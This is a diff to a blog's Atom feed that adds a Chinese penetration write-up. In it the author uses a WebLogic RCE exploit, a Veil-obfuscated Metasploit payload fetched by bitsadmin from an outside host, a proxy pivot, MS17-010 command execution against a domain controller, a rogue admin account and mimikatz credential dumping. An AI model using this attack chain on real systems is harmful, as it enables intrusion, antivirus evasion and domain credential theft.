@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="OneHone.github.io/"/>
-  <updated>2018-03-30T02:23:19.067Z</updated>
+  <updated>2018-04-03T14:00:48.106Z</updated>
   <id>OneHone.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Weblogic引发的血案-2</title>
+    <link href="OneHone.github.io/2018/04/03/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-2/"/>
+    <id>OneHone.github.io/2018/04/03/Weblogic引发的血案-2/</id>
+    <published>2018-04-03T11:52:46.000Z</published>
+    <updated>2018-04-03T14:00:48.106Z</updated>
+    
+    <content type="html"><![CDATA[<p>Somebody I can kiss，I want something just like this.<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上一篇文章一样。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;OXXX</span><br><span class="line">systeminfo --&gt;Windows Serverr 2008 Standard x64</span><br><span class="line">ipconfig --&gt;192.168.101.3</span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户不是管理员组</span><br><span class="line">tasklist --&gt;微软自带杀软 MsMpEng.exe 202个补丁</span><br><span class="line">所属域 --&gt;ALxxx</span><br><span class="line">无视xxx</span><br></pre></td></tr></table></figure><p><img src="/images/Weblogic引发的血案-2/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>此杀软，用<code>Veil免杀</code>生成<code>msf</code>的<code>exp</code>就能过。利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/2.PNG" alt=""><br>运行<code>exp</code>，然后在<code>msf</code>上监听得到<code>shell</code><br><img src="/images/Weblogic引发的血案-2/3.PNG" alt=""><br>cs也来客串一下<br><img src="/images/Weblogic引发的血案-2/4.PNG" alt=""><br>因为不是系统权限，所以尝试了<code>getsystem</code>命令提权，发现报错，<code>mimikatz</code>也抓不出哈希，于是就收集了域信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:ALxxx 查看域控</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/5.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SRxx --&gt;192.168.101.1 域控</span><br><span class="line">SRxxx --&gt;192.168.101.8 域控</span><br><span class="line">GBxxx --&gt;192.168.121.1 域控</span><br></pre></td></tr></table></figure></p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>内网渗透的本质是收集信息 –某大牛<br>现在已掌握的信息如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拿下了192.168.101.3（不完全控制，因为不是最高权限，也不打算往提权方面走，因为我懒）</span><br><span class="line">明确域管和域控</span><br></pre></td></tr></table></figure></p><p>利用<code>x.3</code>机子作为代理机子，这里用到的是<code>ew.exe</code>，代理访问内网。</p><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>似乎代理进内网第一件事情就是扫<code>445端口</code>了<br><img src="/images/Weblogic引发的血案-2/6.PNG" alt=""><br>运气不错，发现域控<code>192.168.101.8</code>存在<code>445漏洞</code>，<code>msf</code>里的<code>ms17-010</code>的利用工具有四个，一个扫描漏洞，一个任意执行命令，两个反弹<code>meterpreter</code>的<code>shell</code>，这里只能用<code>auxiliary/admin/smb/ms17_010_command</code>这模块的，也就是任意执行命令<br>想执行命令上传马儿的，但是<code>powershell</code>和<code>bitsadmin</code>命令执行完后各种报错上传不成功，也试过<code>cs</code>各种<code>exp</code>也弹不回来<code>shell</code>，于是添加管理员用户远程链接之<br><img src="/images/Weblogic引发的血案-2/7.PNG" alt=""><br>上去后发现，原来机子不通外网，难怪之前的马儿回不来。。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>将域控里的管理员密码全部dump出来<br><img src="/images/Weblogic引发的血案-2/8.PNG" alt=""><br>接下来可以拿着域管的账号登入到域里机子了，看了一下有二十多台，代理速度有点慢，所以就不上<code>cs</code>了<br>内网里还要其他域，但这里就不往下搞了</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Somebody I can kiss，I want something just like this.&lt;br&gt;
+    
+    </summary>
+    
+      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Weblogic引发的血案</title>
